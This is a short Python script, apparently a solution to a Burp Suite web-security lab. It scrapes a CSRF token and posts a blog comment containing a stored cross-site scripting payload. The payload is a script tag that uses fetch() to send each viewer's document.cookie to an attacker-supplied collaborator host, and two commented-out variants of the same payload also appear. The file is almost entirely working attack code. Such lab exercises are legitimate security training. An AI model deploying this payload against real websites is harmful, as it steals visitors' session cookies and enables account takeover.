import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <url> <collabolator url>")
        sys.exit(1)

burp_url = sys.argv[1]
session = requests.Session()
collab_url = sys.argv[2]
comment = burp_url + '/post/comment'

response = session.get(burp_url+'/post?postId=6')
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

#burp_data = {"csrf": csrf, "postId": "6", "comment": f"<script>\r\nfetch('https://{collab_url}', {\r\nmethod: 'POST',\r\nmode: 'no-cors',\r\nbody:document.cookie\r\n});\r\n</script>", "name": "1", "email": "1@1.com", "website": ''}
#burp_data = {"csrf": csrf, "postId": "6", "comment": rf"<script>\r\nfetch('https://{collab_url}', {{\r\nmethod: 'POST',\r\nmode: 'no-cors',\r\nbody:document.cookie\r\n}});\r\n</script>", "name": "1", "email": "1@1.com", "website": ''}
burp_data = {"csrf": csrf, "postId": "6", "comment": f"<script>fetch('https://{collab_url}', {{method: 'POST',mode: 'no-cors',body:document.cookie}});</script>", "name": "1", "email": "1@1.com", "website": ''}

session.post(comment, data=burp_data)


print("It is impossible to automate tasks that require a collabulator so.... you have to complete manually")
